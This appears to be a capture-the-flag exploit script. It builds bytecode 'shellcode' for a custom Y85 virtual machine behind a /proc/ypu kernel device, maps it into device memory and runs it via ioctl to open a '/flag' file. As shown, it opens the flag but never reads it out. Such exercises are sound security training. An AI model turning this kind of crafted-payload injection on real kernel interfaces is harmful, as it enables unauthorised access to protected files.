#!/usr/bin/env python3
import struct
import os

def write_y85_instruction(opcode, arg1, arg2):
    """Write a Y85 instruction as 3 bytes"""
    return struct.pack('BBB', opcode, arg1, arg2)

def create_shellcode():
    shellcode = b''
    
    # Magic header - this is what the VM checks for
    shellcode += struct.pack('<I', 0x555059)  # YPU magic as 32-bit int
    
    # Next byte is the initial data segment (ds register)
    shellcode += struct.pack('B', 1)  # Set ds = 1 (use page 1 for data)
    
    # Now the actual instructions start
    # We need to store "/flag\x00" string in memory first
    # Let's put it at offset 0 in data segment (page 1)
    
    # Store "/flag\x00" string at memory location ds:0
    # We'll use immediate loads and stores
    
    # Load '/' into register a, then store at ds:0
    shellcode += write_y85_instruction(0x20, 0, ord('/'))    # imm a, '/'
    shellcode += write_y85_instruction(0x08, 0, 0)           # stm [0], a
    
    # Load 'f' into register a, then store at ds:1  
    shellcode += write_y85_instruction(0x20, 0, ord('f'))    # imm a, 'f'
    shellcode += write_y85_instruction(0x20, 4, 1)           # imm e, 1 (offset)
    shellcode += write_y85_instruction(0x08, 4, 0)           # stm [e], a
    
    # Load 'l' into register a, then store at ds:2
    shellcode += write_y85_instruction(0x20, 0, ord('l'))    # imm a, 'l'  
    shellcode += write_y85_instruction(0x20, 4, 2)           # imm e, 2
    shellcode += write_y85_instruction(0x08, 4, 0)           # stm [e], a
    
    # Load 'a' into register a, then store at ds:3
    shellcode += write_y85_instruction(0x20, 0, ord('a'))    # imm a, 'a'
    shellcode += write_y85_instruction(0x20, 4, 3)           # imm e, 3  
    shellcode += write_y85_instruction(0x08, 4, 0)           # stm [e], a
    
    # Load 'g' into register a, then store at ds:4
    shellcode += write_y85_instruction(0x20, 0, ord('g'))    # imm a, 'g'
    shellcode += write_y85_instruction(0x20, 4, 4)           # imm e, 4
    shellcode += write_y85_instruction(0x08, 4, 0)           # stm [e], a
    
    # Store null terminator at ds:5
    shellcode += write_y85_instruction(0x20, 0, 0)           # imm a, 0
    shellcode += write_y85_instruction(0x20, 4, 5)           # imm e, 5
    shellcode += write_y85_instruction(0x08, 4, 0)           # stm [e], a
    
    # Now call sys_open
    # sys_open needs: a = pathname_offset, b = flags, c = mode
    shellcode += write_y85_instruction(0x20, 0, 0)           # imm a, 0 (pathname at offset 0)
    shellcode += write_y85_instruction(0x20, 1, 0)           # imm b, 0 (O_RDONLY)  
    shellcode += write_y85_instruction(0x20, 2, 0)           # imm c, 0 (mode)
    shellcode += write_y85_instruction(0x04 | 0x08, 0, 3)    # sys_open (0x800), result in d
    
    # Signal success - set signal to 1 to exit cleanly
    shellcode += write_y85_instruction(0x20, 0, 1)           # imm a, 1
    shellcode += write_y85_instruction(0x04 | 0x10, 0, 0)    # sys_signal (0x1000)
    
    return shellcode

def main():
    # Create the Y85 shellcode
    shellcode = create_shellcode()
    
    print(f"Shellcode length: {len(shellcode)} bytes")
    print("Shellcode (hex):", shellcode.hex())
    
    # Open the device
    try:
        fd = os.open("/proc/ypu", os.O_RDWR)
        print("Opened /proc/ypu")
        
        # The device_open function allocates:
        # - code memory (vmalloc_user) 
        # - data memory (kvmalloc_node)
        # We need to write our shellcode to the mapped memory
        
        # First mmap the code region
        import mmap
        code_mem = mmap.mmap(fd, 0x100000, mmap.MAP_SHARED, mmap.PROT_READ | mmap.PROT_WRITE)
        
        # Write shellcode to the beginning
        code_mem[:len(shellcode)] = shellcode
        code_mem.flush()
        
        print("Wrote shellcode to memory")
        
        # Now trigger execution with ioctl
        import fcntl
        result = fcntl.ioctl(fd, 0x539, 0)
        print(f"ioctl result: {result}")
        
        code_mem.close()
        os.close(fd)
        
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
